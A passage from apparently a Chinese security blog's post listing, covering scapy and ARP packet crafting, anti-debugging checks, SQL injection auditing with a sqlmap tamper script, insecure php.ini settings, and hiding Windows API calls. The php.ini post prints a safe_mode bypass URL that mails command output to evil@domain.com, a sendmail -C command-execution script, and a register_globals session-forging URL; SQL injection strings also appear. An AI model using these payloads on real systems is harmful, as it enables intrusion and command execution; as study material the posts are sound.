split_layers        : Split 2 layers previously bound
sr                  : Send and receive packets at layer 3
sr1                 : Send packets at layer 3 and return only the first answer
srbt                : send and receive using a bluetooth socket
srbt1               : send and receive 1 packet using a bluetooth socket
srflood             : Flood and receive packets at layer 3
srloop              : Send a packet at layer 3 in loop and print the answer each time
srp                 : Send and receive packets at layer 2
srp1                : Send and receive packets at layer 2 and return only the first answer
srpflood            : Flood and receive packets at layer 2
srploop             : Send a packet at layer 2 in loop and print the answer each time
tdecode             : Run tshark to decode and display the packet. If no args defined uses -V
traceroute          : Instant TCP traceroute
tshark              : Sniff packets and print them calling pkt.show(), a bit like text wireshark
wireshark           : Run wireshark on a list of packets
wrpcap              : Write a list of packets to a pcap file
</code></pre><p>值得一提的是srbt那一堆方法．        </p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/17/ARP协议详解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/17/ARP协议详解/" class="post-title-link" itemprop="url">ARP协议详解</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-17 22:48:20" itemprop="dateCreated datePublished" datetime="2018-02-17T22:48:20+08:00">2018-02-17</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2018-02-21 23:07:22" itemprop="dateModified" datetime="2018-02-21T23:07:22+08:00">2018-02-21</time>
              </span>
            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><pre><code>ARP协议就是把IP地址解析成MAC地址的协议，RARP协议就是把MAC地址解析成IP地址的协议．
</code></pre><p>###　数据包头结构<br><img src="/2018/02/17/ARP协议详解/2.jpg" alt=""> </p>
<pre><code>typedef struct arphdr //arp协议28字节
{
unsigned short hard_tpye;//硬件类型2字节 通常为01 (以太网地址)
unsigned short protocol;//协议类型2字节 通常为80 (IP地址)
unsigned char hard_length;//硬件地址长度1字节 通常为6
unsigned char protocol_length;//协议地址长度1字节 通常为4 (IP协议)
unsigned short operation_type;//操作类型 1为ARP请求，2为ARP应答，3为RARP请求，4为RARP应答
unsigned char source_mac[6];//源物理地址
struct in_addr source_ip;//源IP地址
unsigned char destination_mac[6];//目的物理地址
struct in_addr destination_ip;//目的IP地址
}ARP_HEADER,*PARPHDR;
</code></pre><h3 id="值得一提的是"><a href="#值得一提的是" class="headerlink" title="值得一提的是"></a>值得一提的是</h3><pre><code>操作类型字段，目前能支持到9

5    DRARP(动态反向地址转换协议) Request
6    DRARP Reply
7    DRARP Error
8    InARP(逆向地址转换协议) Request
9    InARP Relpy

DRARP对应的RFC文档编号为rfc1931
</code></pre><h3 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h3><pre><code> 非常简单，直接构造即可．

In [31]: a=ARP()
In [32]: a.op=1

In [33]: send(a)
.
Sent 1 packets.

In [34]: a.op=2

In [35]: send(a)
.
Sent 1 packets.

In [36]: a.op=3

In [37]: send(a)
.
Sent 1 packets.

In [38]: a.op=4

In [39]: send(a)
.
Sent 1 packets.

In [40]: a.op=5

In [41]: send(a)
.
Sent 1 packets.

In [42]: a.op=6

In [43]: send(a)
.
Sent 1 packets.

In [44]: a.op=7

In [45]: send(a)
.
Sent 1 packets.

In [46]: a.op=8

In [47]: send(a)
.
Sent 1 packets.

In [48]: a.op=9

In [49]: send(a)
.
Sent 1 packets.

In [50]: a.op=10

In [51]: send(a)
.
Sent 1 packets.

In [52]: a.show()
###[ ARP ]###
  hwtype= 0x1
  ptype= 0x800
  hwlen= 6
  plen= 4
  op= 10
  hwsrc= 18:d6:c7:0f:0a:87
  psrc= 192.168.1.104
  hwdst= 00:00:00:00:00:00
  pdst= 0.0.0.0
</code></pre><p>然后抓到的保存成了perfectarp.pcap.</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/13/反调试之检测标题名和类名/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/13/反调试之检测标题名和类名/" class="post-title-link" itemprop="url">反调试之检测标题名和类名</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-13 10:27:39 / Geändert am: 16:12:46" itemprop="dateCreated datePublished" datetime="2018-02-13T10:27:39+08:00">2018-02-13</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过FindWindow函数，找到是否存在黑名单中的标题和类名．</p>
<h3 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h3><p>FindWindow TerminateProcess GetProAddress OpenProcess Process32First Process32Next CreateToolhelp32Snapshot</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>使用CreateToolhelp32Snapshot拍摄进程快照，在使用 Process32First和 Process32Next获取进程信息，再用FindWindow查找是否有黑名单上的标题名或者类名，如果发现执行反调试的行为．</p>
<h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><ul>
<li><p>FindWindow</p>
<pre><code>HWNDFindWindow

(

LPCSTRlpClassName, //一个类名

LPCSTRlpWindowName //一个标题名

);
</code></pre></li>
</ul>
<p>首先按类名寻找，如果类名没有设置，则按标题名．<br>返回那个窗口的句柄．</p>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>如果发现函数列表中没有可疑函数，但是事实上程序执行了相关的操作，那么应该是隐式的函数调用，仔细寻找蛛丝马迹．</p>
<h3 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h3><p>让函数找不到他想找的就行了．</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/11/代码审计之SQL注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/11/代码审计之SQL注入/" class="post-title-link" itemprop="url">代码审计之SQL注入</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-11 12:45:55 / Geändert am: 21:41:52" itemprop="dateCreated datePublished" datetime="2018-02-11T12:45:55+08:00">2018-02-11</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><img src="/2018/02/11/代码审计之SQL注入/SQL注入.jpg" alt=""> </p>
<h3 id="基本注入类型"><a href="#基本注入类型" class="headerlink" title="基本注入类型"></a>基本注入类型</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>因为拼接到SQL语句的中数字型变量过滤不严而导致的漏洞．这种漏洞的利用很大的一个特点是不用闭合引号，但是可能需要闭合括号．<br>测试代码：test1.php<br>防护方法：直接用预编译，或者用intval转换变量类型．</p>
<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>SQL语句中拼进去一个过滤不严的字符串型变量．这种漏洞的利用需要闭合引号或者引号和括号．<br>测试代码：test2.php<br>防护方法：直接用预编译，或者用addslashes（碰上不恰当的编码转换，还会被绕过）．</p>
<h3 id="利用技术"><a href="#利用技术" class="headerlink" title="利用技术"></a>利用技术</h3><p>这里的利用技术，主要指可以sqlmap一把梭的技术．<br>为了能精准触发漏洞，显得比较专业，就得用sqlmap的　–technique 参数<br>例如，–technique=BU 这样的话，sqlmap就只用布尔盲注和联合查询两种技术了．在加上自定义的tamper，就能精准触发漏洞了．<br>一个脚本例子（python2）：</p>
<pre><code>#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
    retVal = &quot;&quot;
    quote, doublequote, firstspace = False, False, False

    for i in xrange(len(payload)):
        if not firstspace:
            if payload[i].isspace():
                firstspace = True
                retVal += &quot;+&quot;
                continue

        elif payload[i] == &apos;\&apos;&apos;:
            quote = not quote

        elif payload[i] == &apos;&quot;&apos;:
            doublequote = not doublequote

        elif payload[i] == &quot; &quot; and not doublequote and not quote:
            retVal += &quot;+&quot;
            continue

        retVal += payload[i]

    return retVal
</code></pre><h3 id="注入触发"><a href="#注入触发" class="headerlink" title="注入触发"></a>注入触发</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>通过GET请求触发</p>
<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>通过POST请求触发</p>
<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>恶意请求经过转义或者过滤，没能实现攻击，但恶意数据正常入库，再程序另一处使用了恶意的变量，可能因为从自身取出数据，就疏于防范导致恶意请求被执行．<br>比如　处理后的数据　\’a\’ or 1=1 –+ 入库，取出时是　‘1’ or 1=1<br>只要有别的地方调用这段数据拼接进SQL语句，就被攻击了．</p>
<h4 id="宽字节注入，不恰当的转换编码导致的注入"><a href="#宽字节注入，不恰当的转换编码导致的注入" class="headerlink" title="宽字节注入，不恰当的转换编码导致的注入"></a>宽字节注入，不恰当的转换编码导致的注入</h4><p>宽字节注入的本质是转换编码的时候，让一个或几个字节跟反斜杠合成一个字符，形象的来说就是＂吃掉反斜杠＂．所以不只是页面编码为gbk的时候才有宽字节注入，不只SQL注入，其他注入型的漏洞有可能有这个问题<br>测试代码：test3.php<br>参考链接：<br><a href="http://blog.csdn.net/u011721501/article/details/42874517" target="_blank" rel="noopener">http://blog.csdn.net/u011721501/article/details/42874517</a><br><a href="http://www.91ri.org/8611.html" target="_blank" rel="noopener">http://www.91ri.org/8611.html</a></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/10/php-ini的不安全配置/" class="post-title-link" itemprop="url">php.ini的不安全配置</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-10 21:27:45" itemprop="dateCreated datePublished" datetime="2018-02-10T21:27:45+08:00">2018-02-10</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2018-02-11 10:56:35" itemprop="dateModified" datetime="2018-02-11T10:56:35+08:00">2018-02-11</time>
              </span>
            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>参考链接<br><a href="http://www.jb51.net/article/5102.htm" target="_blank" rel="noopener">http://www.jb51.net/article/5102.htm</a><br><a href="http://blog.csdn.net/fz_flower/article/details/49509159" target="_blank" rel="noopener">http://blog.csdn.net/fz_flower/article/details/49509159</a></p>
<h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h3><pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
</code></pre><p>安全模式<br><a href="http://php.net/manual/zh/features.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.php</a><br>保护措施和安全模式<br><a href="http://php.net/manual/zh/ini.sect.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.sect.safe-mode.php</a><br>被安全模式限制的函数<br><a href="http://php.net/manual/zh/features.safe-mode.functions.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.functions.php</a></p>
<ul>
<li>safe_mode<br>是否启用 PHP 的安全模式。 </li>
</ul>
<ul>
<li><p>safe_mode_allowed_env<em>vars<br>设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能设置以 PHP</em> 开头的环境变量（例如 PHP_FOO = BAR）。</p>
<pre><code>如果本指令为空，PHP 将使用户可以修改任何环境变量！ 
</code></pre></li>
<li><p>safe_mode_exec_dir<br>如果 PHP 使用了安全模式，system() 和其它程序执行函数将拒绝启动不在此目录中的程序。必须使用 / 作为目录分隔符，包括 Windows 中。 </p>
</li>
</ul>
<ul>
<li><p>disable_functions<br>本指令允许你基于安全原因禁止某些函数。接受逗号分隔的函数名列表作为参数。 disable_functions 不受安全模式的影响。 本指令只能设置在 php.ini 中。例如不能将其设置在 httpd.conf。 </p>
</li>
<li><p>com.allow_dcom</p>
<pre><code>自 PHP 4.0.5 起可用
</code></pre></li>
</ul>
<p>如果打开此选项，PHP 将被允许以一个 D-COM（Distributed COM）客户方式操作并允许 PHP 脚本在远程服务器上实例化 COM 对象。</p>
<h3 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h3><ul>
<li><p>register_global</p>
<pre><code>在 PHP &lt;= 4.2.3 时是 PHP_INI_ALL。 从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。    
</code></pre></li>
</ul>
<p>把EGPCS (Environment, GET, POST, Cookie, Server)注册成全局变量．<br>该项不能在脚本中用ini_set()来配置，但是可以用.htaccess来配置，如　php_flag register_globals off. </p>
<ul>
<li><p>magic_quotes_gpc</p>
<pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
</code></pre></li>
</ul>
<p>远近闻名，魔术引号．<br><a href="http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc" target="_blank" rel="noopener">http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc</a></p>
<h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><ul>
<li><p>allow_url_include<br>php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include<br>允许这几个函数（include, include_once, require, require_once）用通过url来包含文件（FTP,HTTP协议）</p>
</li>
<li><p>allow_url_fopen<br><a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen</a></p>
</li>
</ul>
<h3 id="目录配置"><a href="#目录配置" class="headerlink" title="目录配置"></a>目录配置</h3><ul>
<li><p>expose_php<br>泄漏php版本信息<br>隐藏这个模样的（X-Powered-By: PHP/5.3.7）的相应头．</p>
</li>
<li><p>upload_tmp_dir<br>设置临时目录位置</p>
</li>
<li><p>open_basedir<br><a href="http://php.net/manual/zh/ini.core.php#ini.open-basedir" target="_blank" rel="noopener">http://php.net/manual/zh/ini.core.php#ini.open-basedir</a><br>将 PHP 所能打开的文件限制在指定的目录树，包括文件本身。本指令不受安全模式打开或者关闭的影响。 </p>
</li>
</ul>
<h3 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h3><ul>
<li>display_errors<br>是否回显错误，调试的时候打开</li>
<li>error_reporting<br>错误显示级别</li>
</ul>
<h2 id="不安全配置的利用"><a href="#不安全配置的利用" class="headerlink" title="不安全配置的利用"></a>不安全配置的利用</h2><h3 id="safe-mode绕过漏洞"><a href="#safe-mode绕过漏洞" class="headerlink" title="safe_mode绕过漏洞"></a>safe_mode绕过漏洞</h3><p>还有PHP-4.2.2以下到PHP-4.0.5版本都存在PHP mail函数绕过safe_mode限制执行命令漏洞，4.0.5版本开始mail函数增加了第五个参数，由于设计者考虑不周可以突破safe_mode的限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加shell命令就可以了，比如存在PHP脚本evil.php： </p>
<pre><code>&lt;? mail(&quot;foo@bar,&quot;foo&quot;,&quot;bar&quot;,&quot;&quot;,$bar); ?&gt;  
</code></pre><p>执行如下的URL： </p>
<pre><code>http://foo.com/evil.php?bar=;/usr/bin/id|mail evil@domain.com 
</code></pre><p>这将id执行的结果发送给<br>evil@domain.com </p>
<p>对于4.0.6至4.2.2的PHP突破safe_mode限制其实是利用了sendmail的-C参数，所以系统必须是使用sendmail。如下的代码能够突破safe_mode限制执行命令： </p>
<pre><code>&lt;? 
# 注意，下面这两个必须是不存在的，或者它们的属主和本脚本的属主是一样 
$script=&quot;/tmp/script123&quot;; 
$cf=&quot;/tmp/cf123&quot;; 

$fd = fopen($cf, &quot;w&quot;); 
fwrite($fd, &quot;OQ/tmp 
Sparse=0 
R$*&quot; . chr(9) . &quot;$#local $@ $1 $: $1 
Mlocal, P=/bin/sh, A=sh $script&quot;); 
fclose($fd); 

$fd = fopen($script, &quot;w&quot;); 
fwrite($fd, &quot;rm -f $script $cf; &quot;); 
fwrite($fd, $cmd); 
fclose($fd); 

mail(&quot;nobody&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;-C$cf&quot;); 
?&gt; 
</code></pre><p>还是使用以上有问题版本PHP的用户一定要及时升级到最新版本，这样才能消除基本的安全问题。  </p>
<h3 id="全局变量伪造"><a href="#全局变量伪造" class="headerlink" title="全局变量伪造"></a>全局变量伪造</h3><p>test.php</p>
<pre><code>&lt;?php
if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
    echo &quot;you is admin!&quot;;
}
?&gt;
</code></pre><p>如果register_global模式为On的话，提交：</p>
<pre><code>http://host/test.php?_SESSION[username]=admin
</code></pre><p>就能绕过了．</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/代码审计大的思路/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/10/代码审计大的思路/" class="post-title-link" itemprop="url">代码审计大的思路</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-10 21:06:12 / Geändert am: 23:00:35" itemprop="dateCreated datePublished" datetime="2018-02-10T21:06:12+08:00">2018-02-10</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>拿到一套源码该从哪个地方开始审计，该用什么思路审计，是很值得思考的．    
</code></pre><h3 id="通读原文"><a href="#通读原文" class="headerlink" title="通读原文"></a>通读原文</h3><p>是对代码能力要求比较高的一种方法，耗时多，但是有利于把握程序的逻辑，挖出逻辑漏洞，毕竟不只是getshell才叫漏洞．所期望的功能不能正常实现也是漏洞．</p>
<h3 id="敏感关键字回溯"><a href="#敏感关键字回溯" class="headerlink" title="敏感关键字回溯"></a>敏感关键字回溯</h3><p>这个方法比较迅速，直接在源码里全文搜索关键字，比如可控的参数，编码解码等，容易出错的地方，或是危险函数，一旦发现问题，一般就是大问题，但是不容易挖到逻辑漏洞，因为对程序的功能不够了解</p>
<h3 id="功能定向审计"><a href="#功能定向审计" class="headerlink" title="功能定向审计"></a>功能定向审计</h3><p>拿到源码之后先看看怎么用，有什么用，看看有啥功能，然后针对功能，黑白盒测试相结合，事半功倍．比如，程序安装，文件上传，文件管理，登录验证，备份，找回密码，购物车，评论等等．感觉这个方法比较高效一些．</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/隐式地调用系统API/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/10/隐式地调用系统API/" class="post-title-link" itemprop="url">隐式地调用系统API</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-10 19:55:54 / Geändert am: 20:14:29" itemprop="dateCreated datePublished" datetime="2018-02-10T19:55:54+08:00">2018-02-10</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="隐藏调用系统API"><a href="#隐藏调用系统API" class="headerlink" title="隐藏调用系统API"></a>隐藏调用系统API</h4><pre><code>如果直接调用API，在将程序逆向的时候就会直接显示出被调用的函数的名字，所以根据程序的功能，结合调试器给出的提示很容易的就能定位关键代码，从而破解程序，所以程序员就采取一定的办法来隐式地调用系统API．
</code></pre><ul>
<li><p>下边这种办法比较简单，毕竟还是可以通过LoadlLibrary(),GetProcAddress()这俩函数来判断程序用了什么函数，通过在GetProcessAddress上下一个条件断点（一般返回值放在EAX，参数直接推进栈），来记录，它获取过什么函数的地址即可．</p>
</li>
<li><p>示例代码：</p>
<pre><code>TCHAR DllName[MAX_PATH]=&quot;user32.dll&quot;;
TCHAR ImportedFunctionName[MAX_PATH]=&quot;MessageBoxA&quot;;
HANDLE hDllModule=NULL;
DWORD dwFunctionAddress=0;

hDllModule=LoadLibrary(DllName);    
(FARPROC)dwFunctionAddress=GetProcAddress(hDllModule,ImportedFunctionName);
((FARPROC)dwFunctionAddress)(NULL,OutputInfor,&quot;Info&quot;,MB_OK | MB_ICONINFORMATION);
</code></pre></li>
<li><p>手动实现call指令方式，让调试器认不出call，如果开发者所有的API的这么调用，也算有恒心有毅力的了，放过他吧．</p>
</li>
<li><p>实例代码：</p>
<pre><code>_asm
{
            push MB_OK
            push StringAddress
            mov eax,0
            push eax
            push eax

            mov eax,offset Label
            push eax
            jmp [dwFunctionAddress]                //call MessageBox()
label:    
            nop
            nop
}
</code></pre></li>
</ul>
<p>以上代码段中的</p>
<pre><code>mov eax,offset Label001
push eax
jmp [dwFunctionAddress]       
</code></pre><p>实现了CALL 指令的功能，且功能有所增强，如果使用CALL 指令，API函数的返回地址必定是紧接CALL 指令的下一条指令的地址。<br>而此代码段可返回到任意指定地址，形成更具迷惑性的代码。</p>
<ul>
<li>动态解密函数名，感觉应该不如第二有迷惑性，找到动态解密函数的代码段即可了．<br>代码实例不好找</li>
</ul>
<p>参考链接：</p>
<pre><code>https://bbs.pediy.com/thread-73398.htm
</code></pre>
        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/反调试之检测进程名/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/10/反调试之检测进程名/" class="post-title-link" itemprop="url">反调试之检测进程名</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-10 11:01:26 / Geändert am: 21:05:26" itemprop="dateCreated datePublished" datetime="2018-02-10T11:01:26+08:00">2018-02-10</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通过遍历进程列表，读取所有进程名，一旦发现黑名单上的进程名，打开它的进程，获得他的句柄，并且关闭它．</p>
<h4 id="涉及的API"><a href="#涉及的API" class="headerlink" title="涉及的API"></a>涉及的API</h4><ul>
<li>EnumProcesses<br>枚举所有的进程PID（进程标识符）<br><a href="http://www.baike.com/wiki/EnumProcesses&amp;prd=button_doc_jinru" target="_blank" rel="noopener">互动百科－EnumProcesses</a> </li>
</ul>
